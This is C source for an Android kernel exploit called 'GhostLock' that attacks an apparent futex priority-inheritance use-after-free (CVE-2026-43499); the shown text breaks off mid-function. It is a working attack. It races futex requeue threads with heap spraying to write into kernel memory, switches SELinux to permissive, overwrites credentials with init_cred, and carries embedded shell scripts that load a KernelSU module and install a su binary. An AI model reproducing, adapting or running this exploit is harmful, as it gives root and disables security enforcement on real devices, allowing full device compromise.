/*
 * GhostLock — CVE-2026-43499 futex PI UAF exploit
 *
 * Phase 1: Write 1 — SELinux permissive (child-node PI write)
 * Phase 2: Write 2 — cred = init_cred (child-node PI write via perf task leak)
 */

#include "common.h"
#include "offsets.h"
#include "ko_loader.h"
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <linux/perf_event.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/utsname.h>
#include <signal.h>
#include <fcntl.h>
#include <grp.h>

const struct kernel_offsets *active_offsets = NULL;

/* Override target.h _OFF macros with dynamic offsets from offsets.h table */
#undef SELINUX_ENFORCING_OFF
#undef INIT_CRED_OFF
#undef INIT_TASK_OFF
#undef INIT_UTS_NS_OFF
#undef EMPTY_ZERO_PAGE_OFF
#undef ROOT_TASK_GROUP_OFF
#undef KPTR_RESTRICT_OFF
#undef SELINUX_BLOB_SIZES_OFF
#undef SECURITY_HOOK_HEADS_OFF
#undef KMALLOC_CACHES_OFF
#undef ANON_PIPE_BUF_OPS_OFF
#undef ASHMEM_MISC_FOPS_OFF
#undef ASHMEM_FOPS_OFF
#undef ASHMEM_IOCTL_OFF
#undef ASHMEM_COMPAT_IOCTL_OFF
#undef ASHMEM_MMAP_OFF
#undef ASHMEM_OPEN_OFF
#undef ASHMEM_RELEASE_OFF
#undef ASHMEM_SHOW_FDINFO_OFF
#undef CONFIGFS_READ_ITER_OFF
#undef CONFIGFS_BIN_WRITE_ITER_OFF
#undef COPY_SPLICE_READ_OFF
#undef NOOP_LLSEEK_OFF
#undef CAP_CAPABLE_ACTIVE_OFF
#undef SLIDE_NFULNL_LOGGER_OFF
#undef SLIDE_LOGGERS_0_1_OFF
#undef SLIDE_RANDOM_BOOT_ID_DATA_OFF
#undef SLIDE_SYSCTL_BOOTID_OFF

#define SELINUX_ENFORCING_OFF         active_offsets->off_selinux_enforcing
#define INIT_CRED_OFF                 active_offsets->off_init_cred
#define INIT_TASK_OFF                 active_offsets->off_init_task
#define INIT_UTS_NS_OFF               active_offsets->off_init_uts_ns
#define EMPTY_ZERO_PAGE_OFF           active_offsets->off_empty_zero_page
#define ROOT_TASK_GROUP_OFF           active_offsets->off_root_task_group
#define KPTR_RESTRICT_OFF             active_offsets->off_kptr_restrict
#define SELINUX_BLOB_SIZES_OFF        active_offsets->off_selinux_blob_sizes
#define SECURITY_HOOK_HEADS_OFF       active_offsets->off_security_hook_heads
#define KMALLOC_CACHES_OFF            active_offsets->off_kmalloc_caches
#define ANON_PIPE_BUF_OPS_OFF         active_offsets->off_anon_pipe_buf_ops
#define ASHMEM_MISC_FOPS_OFF          active_offsets->off_ashmem_misc_fops
#define ASHMEM_FOPS_OFF               active_offsets->off_ashmem_fops
#define ASHMEM_IOCTL_OFF              active_offsets->off_ashmem_ioctl
#define ASHMEM_COMPAT_IOCTL_OFF       active_offsets->off_ashmem_compat_ioctl
#define ASHMEM_MMAP_OFF               active_offsets->off_ashmem_mmap
#define ASHMEM_OPEN_OFF               active_offsets->off_ashmem_open
#define ASHMEM_RELEASE_OFF            active_offsets->off_ashmem_release
#define ASHMEM_SHOW_FDINFO_OFF        active_offsets->off_ashmem_show_fdinfo
#define CONFIGFS_READ_ITER_OFF        active_offsets->off_configfs_read_iter
#define CONFIGFS_BIN_WRITE_ITER_OFF   active_offsets->off_configfs_bin_write_iter
#define COPY_SPLICE_READ_OFF          active_offsets->off_copy_splice_read
#define NOOP_LLSEEK_OFF               active_offsets->off_noop_llseek
#define CAP_CAPABLE_ACTIVE_OFF        active_offsets->off_cap_capable_active
#define SLIDE_NFULNL_LOGGER_OFF       active_offsets->off_slide_nfulnl_logger
#define SLIDE_LOGGERS_0_1_OFF         active_offsets->off_slide_loggers_0_1
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF active_offsets->off_slide_boot_id
#define SLIDE_SYSCTL_BOOTID_OFF       active_offsets->off_slide_boot_id

/* Override struct field offsets (task_struct, etc.) with per-device values */
#include "runtime_struct_offsets.h"

static int select_offsets(void) {
  struct utsname uts;
  if (uname(&uts) < 0) return -1;
  pr_info("kernel: %s\n", uts.release);
  for (int i = 0; known_offsets[i].uname_r; i++) {
    if (strcmp(uts.release, known_offsets[i].uname_r) == 0) {
      active_offsets = &known_offsets[i];
      pr_success("offsets matched: %s\n", active_offsets->uname_r);
      if (active_offsets->kimage_text_base) {
        p0_kimage_text_base = active_offsets->kimage_text_base;
      }
      if (active_offsets->kernel_phys_load) {
        p0_kernel_phys_load = active_offsets->kernel_phys_load;
      }
      if (active_offsets->phys_offset) {
        p0_phys_offset = active_offsets->phys_offset;
      }
      const char *kphys_env = getenv("KPHYS");
      if (kphys_env) {
        p0_kernel_phys_load = strtoull(kphys_env, NULL, 0);
        pr_info("KPHYS env override: 0x%llx\n", (unsigned long long)p0_kernel_phys_load);
      }
      g_init_cred_image = INIT_CRED;
      pr_info("init_cred image=%016zx alias=%016zx\n",
              (size_t)g_init_cred_image, (size_t)data_addr(g_init_cred_image));
      pr_info("kphys_load=0x%llx phys_offset=0x%llx page_offset=0x%llx\n",
              (unsigned long long)p0_kernel_phys_load,
              (unsigned long long)p0_phys_offset,
              (unsigned long long)P0_PAGE_OFFSET);
      return 0;
    }
  }
  pr_error("no offsets for kernel: %s\n", uts.release);
  pr_error("add this kernel to offsets.h and rebuild\n");
  return -1;
}

static struct timespec t0;
static void timer_reset(void) { clock_gettime(CLOCK_MONOTONIC, &t0); }
static double timer_ms(void) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - t0.tv_sec) * 1000.0 + (now.tv_nsec - t0.tv_nsec) / 1e6;
}
#define TIMER(label) pr_info("[T+%.0fms] %s\n", timer_ms(), label)

extern int pselect_custom_write;
extern uintptr_t pselect_custom_target;
extern uintptr_t pselect_custom_value;
extern int pselect_child_node;
void set_pselect_write_mode(uintptr_t target, uintptr_t value, int mode);
void clear_pselect_write(void);

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
int memfd_leak;
uint32_t f_helper;
atomic_int helper_ready;

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);
  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
    pr_error("waiter lock chain errno=%d\n", errno);
  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) usleep(1000);
  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;
  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long wrp_ret = futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  int wrp_err = errno;
  pr_info("waiter: WAIT_REQUEUE_PI returned ret=%ld errno=%d\n", wrp_ret, wrp_err);
  do_pselect_fake_lock_route();
  atomic_store(&route_done, 1);
  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) usleep(1000);
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
  while (!atomic_load(&waiter_ready)) usleep(1000);
  atomic_store(&owner_started, 1);
  {
    struct timespec chain_to;
    clock_gettime(CLOCK_REALTIME, &chain_to);
    chain_to.tv_nsec += 300000000;
    if (chain_to.tv_nsec >= 1000000000) {
      chain_to.tv_nsec -= 1000000000;
      chain_to.tv_sec += 1;
    }
    futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, &chain_to, NULL, 0);
  }
  futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  pr_info("owner: released f_pi_target for cleanup_proxy_lock takeover\n");
  atomic_store(&owner_chain_done, 1);
  while (!atomic_load(&route_done)) usleep(5000);
  return NULL;
}

void *helper_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);
  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += 30;
  atomic_store(&helper_ready, 1);
  errno = 0;
  long ret = futex_op(&f_helper, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  int err = errno;
  pr_info("helper: WAIT_REQUEUE_PI returned ret=%ld errno=%d\n", ret, err);
  return NULL;
}

/* The consumer uses sched_setattr (SCHED_BATCH + nice change) on the
   waiter's TID to trigger rt_mutex_adjust_prio_chain. The priority change
   forces the chain walk to dequeue/re-enqueue the stale waiter's
   pi_tree_entry → rb_erase → ghost write. This is the mechanism used
   by the ghostlock-app reference implementation. */
static int wait_for_waiter_in_pselect(int tid, int timeout_ms) {
  char path[64];
  snprintf(path, sizeof(path), "/proc/self/task/%d/syscall", tid);
  struct timespec t0;
  clock_gettime(CLOCK_MONOTONIC, &t0);
  for (;;) {
    int fd = open(path, O_RDONLY);
    if (fd >= 0) {
      char buf[64] = {0};
      read(fd, buf, sizeof(buf) - 1);
      close(fd);
      long nr = strtol(buf, NULL, 10);
      if (nr == 72) {
        usleep(5000);
        return 1;
      }
    }
    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    long elapsed_ms = (now.tv_sec - t0.tv_sec) * 1000 +
                      (now.tv_nsec - t0.tv_nsec) / 1000000;
    if (elapsed_ms > timeout_ms) return 0;
    usleep(500);
  }
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);
  int seen = 0;
  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }
    seen = seq;
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      if (!wait_for_waiter_in_pselect(tid, 2000)) {
        crash_log_write("consumer: waiter tid=%d NOT in pselect after 2s\n", tid);
        break;
      }
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) usleep((useconds_t)delay_usec);
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) break;
        atomic_fetch_add(&consumer_calls, 1);
        errno = 0;
        /* Rotate nice value each call: (calls%19)+1 ensures the waiter's
           effective priority changes, creating a mismatch with the overlay's
           FAKE_WAITER_PRIO (140). This forces the chain walk to dequeue the
           stale pi_tree_entry via rb_erase → ghost write. */
        int consumer_nice = (calls_this_seq % 19) + 1;
        crash_log_write("consumer PRE sched_setattr tid=%d nice=%d\n", tid, consumer_nice);
        long sched_ret = sched_setattr_tid(tid, consumer_nice);
        int sched_errno = errno;
        crash_log_write("consumer POST sched_setattr ret=%ld errno=%d\n", sched_ret, sched_errno);
        if (sched_ret != 0) {
          /* Fallback: FUTEX_LOCK_PI also triggers chain walk */
          struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
          long fret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
          if (fret == 0) {
            futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            sched_ret = 0;
          }
        }
        (void)sched_errno;
        if (sched_ret == 0) {
          atomic_fetch_add(&consumer_success, 1);
          syscall(SYS_tgkill, getpid(), tid, SIGUSR1);
        }
        calls_this_seq++;
        {
          static int max_calls = -1;
          if (max_calls < 0) {
            const char *mc = getenv("PSELECT_CONSUMER_MAX_CALLS");
            max_calls = mc ? atoi(mc) : CONSUMER_MAX_CALLS;
            if (max_calls < 1) max_calls = 1;
          }
          if (calls_this_seq >= max_calls) {
            atomic_store(&punch_consume_go, 0);
            break;
          }
        }
      }
    }
  }
  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0; f_pi_target = 0; f_pi_chain = 0; f_helper = 0;
  atomic_store(&waiter_ready, 0); atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0); atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0); atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0); atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
  atomic_store(&helper_ready, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  atomic_store(&pipe_prepare_request, 0); atomic_store(&pipe_prepare_done, 0);
  cfi_last_step = 0; cfi_last_errno = 0;
}

void run_main_route_threads(void) {
  reset_main_route_state();
  pthread_t waiter, owner, consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started))
    usleep(1000);
  usleep(50000);
  errno = 0;
  long rq_ret = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
  int rq_err = errno;
  pr_info("requeuer: CMP_REQUEUE_PI ret=%ld errno=%d\n", rq_ret, rq_err);
  while (!atomic_load(&route_done)) usleep(5000);
  atomic_store(&punch_consume_stop, 1);
  pthread_join(waiter, NULL);
  pthread_join(owner, NULL);
  pthread_join(consumer, NULL);
}

static int do_one_write(uintptr_t target, const char *desc, int mode) {
  pr_info("=== %s === target=0x%016zx mode=%d\n", desc, target, mode);
  pselect_child_node = 1;
  set_pselect_write_mode(target, 0, mode);
  TIMER("  heap spray start");

  /* Bypass path: skip mm_struct leak + page spray entirely for W1 (mode 1).
   * Use existing writable kernel addresses for the stale waiter's fields.
   * Use mode 4 (fops redirect layout) which sets pi_pc=target-8 and pi_right
   * to trigger __rb_change_child(parent, child=NULL) → writes NULL to target.
   * 
   * The erased node (pi_right) points to empty_zero_page — a page of all
   * zeros in kernel data space. Both node->rb_right and node->rb_left at
   * fake_fops+0x08 and fake_fops+0x10 are 0, making it a leaf node.
   * rb_erase splices a leaf as NULL → __rb_change_child writes NULL to
   * parent->rb_right = target → selinux_enforcing = 0 → Permissive.
   *
   * No fake page or mm_struct needed — the PI traversal uses real addresses. */
  if (mode == 1 && env_flag("BYPASS_MM", 0)) {
    page_base = target;  /* non-zero: signals route that setup is done */
    fake_lock = target;  /* use selinux_enforcing as the spinlock */
    fake_task = text_addr(INIT_TASK);
    fake_fops = text_addr(EMPTY_ZERO_PAGE);
    fake_w0 = target;    /* unused but set to valid address */
    fake_parent = target - 8;
    fake_right = 0x100;  /* non-zero "node" to be erased */
    fake_left = 0;
    binwrite_target = 0;
    pselect_custom_write = 4;  /* use mode-4 layout (pi_pc=target-8, pi_right=fake_fops) */
    pselect_child_node = 1;
    pr_info("  bypass-mm: lock=0x%zx task=0x%zx parent=0x%zx zero_page=0x%zx mode=%d\n",
            fake_lock, fake_task, fake_parent, fake_fops, pselect_custom_write);
    TIMER("  heap spray bypassed");
  } else {
    int spray_attempts = 0;
    for (;;) {
      spray_attempts++;
      page_base = prepare_pagemap_page(PAGE_PAYLOAD_FOPS);
      if (!page_base) {
        pr_warning("  pagemap failed, trying KernelSnitch fallback\n");
        page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      }
      if (!page_base) { pr_error("  heap spray failed\n"); clear_pselect_write(); return 0; }
      /* W1 (SELinux): the ghost write stores fake_right across selinux_state.
       * Byte 2 of fake_right lands on the `initialized` bool. The kernel
       * checks bools with tbnz (test bit 0), so if bit 0 of byte 2 is 0
       * the write clears `initialized`, breaking all SID lookups.
       * Reject the page and re-spray (reference: payload_write_layout_accepts_page). */
      if (mode == 1 && fake_right && ((fake_right >> 16) & 1) == 0) {
        pr_warning("  spray page 0x%zx: fake_right=0x%zx byte2=0x%02x bit0=0 "
                   "— would clear initialized; re-spraying (%d)\n",
                   page_base, fake_right, (unsigned)((fake_right >> 16) & 0xFF),
                   spray_attempts);
        if (spray_attempts >= 8) {
          pr_error("  gave up after %d spray attempts with bad bit16\n", spray_attempts);
          clear_pselect_write();
          return 0;
        }
        cleanup_page_prepare_state();
        continue;
      }
      break;
    }
    if (spray_attempts > 1)
      pr_info("  accepted spray page after %d attempts\n", spray_attempts);
    TIMER("  heap spray done");
  }
  run_main_route_threads();
  close_reclaim_sockets();
  TIMER("  PI route done");
  clear_pselect_write();
  return 1;
}

static int check_selinux_off(void) {
  int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
  if (efd < 0) return 1;
  char b[4] = {0};
  read(efd, b, sizeof(b));
  close(efd);
  return b[0] == '0';
}

static int write_selinux_policy_fix_script(void) {
  static const char fix_script[] =
    "#!/system/bin/sh\n"
    "P=/sys/fs/selinux/policy\n"
    "L=/sys/fs/selinux/load\n"
    "T=/data/local/tmp/.ghostlock_policy.bin\n"
    "LOG=/data/local/tmp/.ghostlock_policy.log\n"
    "exec >>$LOG 2>&1\n"
    "echo \"[*] policy fix: uid=$(id -u) enforce=$(cat /sys/fs/selinux/enforce 2>/dev/null)\"\n"
    "# W1 ghost write corrupts selinux_state policycap[3..4] (ALWAYSNETWORK,\n"
    "# CGROUPSECLABEL). Reloading the unmodified policy re-derives policycap\n"
    "# from the policy binary, restoring correct values.\n"
    "rm -f $T 2>/dev/null\n"
    "cp $P $T || { echo '[!] policy fix: policy copy failed'; exit 1; }\n"
    "SZ=$(wc -c < $T)\n"
    "[ \"$SZ\" -gt 20 ] || { echo \"[!] policy fix: policy too short ($SZ bytes)\"; exit 1; }\n"
    "echo \"[*] policy fix: reloading $SZ byte policy to restore policycap values\"\n"
    "# /sys/fs/selinux/load requires the entire policy in a single write().\n"
    "# load_policy uses mmap+write and is reliable; dd may split large writes.\n"
    "if load_policy $T 2>/dev/null; then\n"
    "  echo '[+] policy fix: policy loaded via load_policy'\n"
    "  rm -f $T\n"
    "  echo 0 > /sys/fs/selinux/enforce\n"
    "  exit 0\n"
    "fi\n"
    "if cat $T > $L 2>/dev/null; then\n"
    "  echo '[+] policy fix: policy loaded via cat'\n"
    "  rm -f $T\n"
    "  echo 0 > /sys/fs/selinux/enforce\n"
    "  exit 0\n"
    "fi\n"
    "echo '[!] policy fix: policy load failed'\n"
    "rm -f $T\n"
    "exit 1\n";
  int sfd = open("/data/local/tmp/.ghostlock_fixpol.sh", O_WRONLY | O_CREAT | O_TRUNC, 0755);
  if (sfd < 0) {
    pr_info("fix_policy: write script failed errno=%d\n", errno);
    return 0;
  }
  ssize_t wrote = write(sfd, fix_script, strlen(fix_script));
  close(sfd);
  if (wrote != (ssize_t)strlen(fix_script)) {
    pr_info("fix_policy: script write failed ret=%zd errno=%d\n", wrote, errno);
    return 0;
  }
  return 1;
}

static int kernelsu_module_loaded(void) {
  int fd = open("/proc/modules", O_RDONLY);
  if (fd < 0) return 0;

  char modules[8192] = {0};
  ssize_t n = read(fd, modules, sizeof(modules) - 1);
  close(fd);
  return n > 0 && strstr(modules, "kernelsu ") != NULL;
}

static int wait_for_ksu_status(void) {
  static const char status_path[] = "/data/local/tmp/.ghostlock_ksu.status";

  for (int attempt = 1; attempt <= 40; attempt++) {
    /* The late-load helper can be replaced or blocked as the module comes
     * online. /proc/modules is observable from this original shell and is
     * therefore the authoritative readiness signal. */
    if (kernelsu_module_loaded()) {
      pr_success("KernelSU module is loaded\n");
      return 0;
    }

    char status[128] = {0};
    int fd = open(status_path, O_RDONLY);
    if (fd >= 0) {
      ssize_t n = read(fd, status, sizeof(status) - 1);
      close(fd);
      if (n > 0) {
        status[strcspn(status, "\r\n")] = '\0';
        if (!strcmp(status, "ready")) {
          pr_success("KernelSU helper reports ready\n");
          return 0;
        }
        if (!strncmp(status, "failed:", 7)) {
          pr_error("KernelSU helper reports %s; see .ghostlock_root.log and .ghostlock_ksud.log\n",
                   status);
          return 1;
        }
      }
    }
    if (attempt == 1 || attempt % 10 == 0) {
      pr_info("waiting for KernelSU helper status (%d/40)\n", attempt);
    }
    sleep(1);
  }

  pr_error("KernelSU helper did not report readiness; see .ghostlock_root.log and .ghostlock_ksud.log\n");
  return 1;
}

static void slab_drain(void) {
  struct timespec up;
  clock_gettime(CLOCK_BOOTTIME, &up);
  int waves = (up.tv_sec > 60) ? 5 : 2;
  int batch = (up.tv_sec > 60) ? 400 : 200;
  for (int wave = 0; wave < waves; wave++) {
    pid_t *drain = calloc(batch, sizeof(pid_t));
    int n = 0;
    for (int i = 0; i < batch; i++) {
      drain[i] = fork();
      if (drain[i] == 0) { pause(); _exit(0); }
      if (drain[i] > 0) n++;
    }
    for (int i = 0; i < n; i++) {
      kill(drain[i], SIGKILL);
      waitpid(drain[i], NULL, 0);
    }
    free(drain);
    sched_yield();
  }
}

static void write_root_script(void) {
  int sfd = open("/data/local/tmp/.ghostlock_root.sh", O_WRONLY|O_CREAT|O_TRUNC, 0755);
  if (sfd < 0) return;
  int policy_script_ready = write_selinux_policy_fix_script();
  unlink("/data/local/tmp/.ghostlock_ksu.status");
  const char *script =
    "#!/system/bin/sh\n"
    "ROOT_LOG=/data/local/tmp/.ghostlock_root.log\n"
    "STATUS=/data/local/tmp/.ghostlock_ksu.status\n"
    "diag() { echo \"$*\"; echo \"$*\" >>$ROOT_LOG; }\n"
    "report_status() { printf '%s\\n' \"$1\" >$STATUS; }\n"
    "report_status pending\n"
    "diag '[+] root shell pid='$$' uid='$(id -u)\n"
    "if [ -x /data/local/tmp/.ghostlock_fixpol.sh ]; then\n"
    "  diag '[*] repairing SELinux policy before KernelSU'\n"
    "  if /system/bin/sh /data/local/tmp/.ghostlock_fixpol.sh; then\n"
    "    diag '[+] early SELinux policy repair succeeded'\n"
    "    diag '[*] keeping SELinux permissive until KernelSU is ready'\n"
    "  else\n"
    "    diag '[!] early SELinux policy repair failed; see .ghostlock_policy.log'\n"
    "  fi\n"
    "  rm -f /data/local/tmp/.ghostlock_fixpol.sh\n"
    "else\n"
    "  diag '[!] policy repair script was not created'\n"
    "fi\n"
    "LOCAL_KO=/data/local/tmp/kernelsu.ko\n"
    "if [ -f \"$LOCAL_KO\" ] && ! grep -q kernelsu /proc/modules 2>/dev/null; then\n"
    "  diag '[*] trying insmod of local kernel module:' \"$LOCAL_KO\"\n"
    "  insmod \"$LOCAL_KO\" 2>&1 | tee -a $ROOT_LOG\n"
    "  if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
    "    diag '[+] insmod succeeded — KernelSU loaded from local .ko'\n"
    "  else\n"
    "    diag '[!] insmod failed, falling back to ksud'\n"
    "  fi\n"
    "fi\n"
    "# Use standalone ksud binary first, then app's libksud.so\n"
    "KSUD=/data/local/tmp/ksud\n"
    "if [ ! -f \"$KSUD\" ]; then\n"
    "  KSUD=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
    "fi\n"
    "if [ ! -f \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
    "KSU_READY=0\n"
    "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
    "  diag '[+] KernelSU already loaded'\n"
    "  KSU_READY=1\n"
    "fi\n"
    "# Always run ksud setup (module needs userspace components)\n"
    "if [ -f \"$KSUD\" ]; then\n"
    "  chmod 755 \"$KSUD\" 2>/dev/null\n"
    "  diag '[*] ksud binary:' $KSUD\n"
    "  diag '[*] ksud version:' $($KSUD -V 2>&1)\n"
    "  # Set up /data/adb/ksu directory structure\n"
    "  mkdir -p /data/adb/ksu/bin 2>/dev/null\n"
    "  cp \"$KSUD\" /data/adb/ksu/bin/ksud 2>/dev/null\n"
    "  cp \"$KSUD\" /data/adb/ksud 2>/dev/null\n"
    "  chmod 755 /data/adb/ksu/bin/ksud /data/adb/ksud 2>/dev/null\n"
    "  KSUD_LOG=/data/local/tmp/.ghostlock_ksud.log\n"
    "  rm -f \"$KSUD_LOG\"\n"
    "  # Install userspace components (su binary, etc)\n"
    "  diag '[*] ksud install'\n"
    "  /data/adb/ksu/bin/ksud install >\"$KSUD_LOG\" 2>&1\n"
    "  diag '[*] ksud install exit='$?\n"
    "  if [ -s \"$KSUD_LOG\" ]; then\n"
    "    cat \"$KSUD_LOG\" | while read l; do diag \"  install: $l\"; done\n"
    "  fi\n"
    "  # Trigger setup events\n"
    "  diag '[*] triggering post-fs-data'\n"
    "  /data/adb/ksu/bin/ksud post-fs-data >>\"$KSUD_LOG\" 2>&1\n"
    "  diag '[*] post-fs-data exit='$?\n"
    "  diag '[*] triggering services'\n"
    "  /data/adb/ksu/bin/ksud services >>\"$KSUD_LOG\" 2>&1\n"
    "  diag '[*] services exit='$?\n"
    "  diag '[*] triggering boot-completed'\n"
    "  /data/adb/ksu/bin/ksud boot-completed >>\"$KSUD_LOG\" 2>&1\n"
    "  diag '[*] boot-completed exit='$?\n"
    "  # Register ReSukiSU as manager\n"
    "  diag '[*] enabling dynamic managers'\n"
    "  /data/adb/ksu/bin/ksud manager set-enabled true >>\"$KSUD_LOG\" 2>&1\n"
    "  diag '[*] set-enabled exit='$?\n"
    "  diag '[*] adding ReSukiSU manager'\n"
    "  /data/adb/ksu/bin/ksud manager add com.resukisu.resukisu 264 d6f75c5b4d03a33f0826bf8e6ed98c790a794eb4fa959ed105a312148d18b193 >>\"$KSUD_LOG\" 2>&1\n"
    "  diag '[*] manager add exit='$?\n"
    "  diag '[*] listing managers:'\n"
    "  /data/adb/ksu/bin/ksud manager list 2>&1 | while read l; do diag \"  mgr: $l\"; done\n"
    "  # Check if su is available now\n"
    "  if [ -x /data/adb/ksu/bin/su ] || which su >/dev/null 2>&1; then\n"
    "    diag '[+] su binary available'\n"
    "  else\n"
    "    diag '[!] su binary NOT available, checking paths:'\n"
    "    ls -la /data/adb/ksu/bin/ 2>&1 | while read l; do diag \"  $l\"; done\n"
    "  fi\n"
    "else\n"
    "  diag '[!] ksud binary not found'\n"
    "fi\n"
    "if grep -q kernelsu /proc/modules 2>/dev/null; then KSU_READY=1; fi\n"
    "if [ \"$KSU_READY\" = 1 ]; then\n"
    "  diag '[+] KSU LOADED'\n"
    "  grep kernelsu /proc/modules\n"
    "  rm -f /data/local/tmp/.ghostlock_w1\n"
    "  # KernelSU module handles SELinux re-enforcement\n"
    "  diag '[*]' $(id) 'enforce='$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
    "  report_status ready\n"
    "  diag '[+] done'\n"
    "else\n"
    "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
    "  diag '[*]' $(id) 'enforce='$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
    "  report_status failed:module-not-loaded\n"
    "  diag '[!] KSU NOT loaded'\n"
    "fi\n"
    "# Policycap check: verify ALWAYSNETWORK is correct after reload\n"
    "ANC=$(cat /sys/fs/selinux/policy_capabilities/always_check_network 2>/dev/null)\n"
    "diag '[*] policycap always_check_network='$ANC\n"
    "if [ \"$ANC\" = \"1\" ]; then\n"
    "  diag '[!] WARNING: ALWAYSNETWORK still corrupted, networking may be broken'\n"
    "fi\n"
    "# Quick networking test (only meaningful if WiFi/LTE enabled)\n"
    "if ping -c 1 -W 2 8.8.8.8 >/dev/null 2>&1; then\n"
    "  diag '[+] networking OK'\n"
    "else\n"
    "  diag '[*] networking test failed (may be airplane mode)'\n"
    "fi\n"
    "if [ -t 0 ]; then exec /system/bin/sh -i; fi\n";
  if (!policy_script_ready) {
    pr_info("root script: early policy repair script unavailable\n");
  }
  write(sfd, script, strlen(script));
  fsync(sfd);
  close(sfd);
  sync();
}

/* perf_find_task - only used when perf is available (shell context) */
/* Also captures mm_struct candidates from registers during getpid(). */
uintptr_t perf_find_task(void) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = 5000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 32) - 1;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.exclude_idle = 1;

  errno = 0;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) { pr_error("perf_event_open failed errno=%d\n", errno); return 0; }
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) { pr_error("perf mmap failed errno=%d\n", errno); close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (volatile int i = 0; i < 1000000; i++) {
    syscall(__NR_getpid);
    if ((i & 0x3f) == 0) {
      /* Every 64th iteration: trigger mmap+mprotect to invoke code path
       * that accesses current->mm. Also occasionally trigger clone()
       * which explicitly loads current->mm into a register. */
      void *x = mmap(NULL, PAGE_SIZE, PROT_READ|PROT_WRITE,
                     MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
      if (x != MAP_FAILED) munmap(x, PAGE_SIZE);
      /* Every 256th: try clone (without CLONE_VM) to trigger copy_process
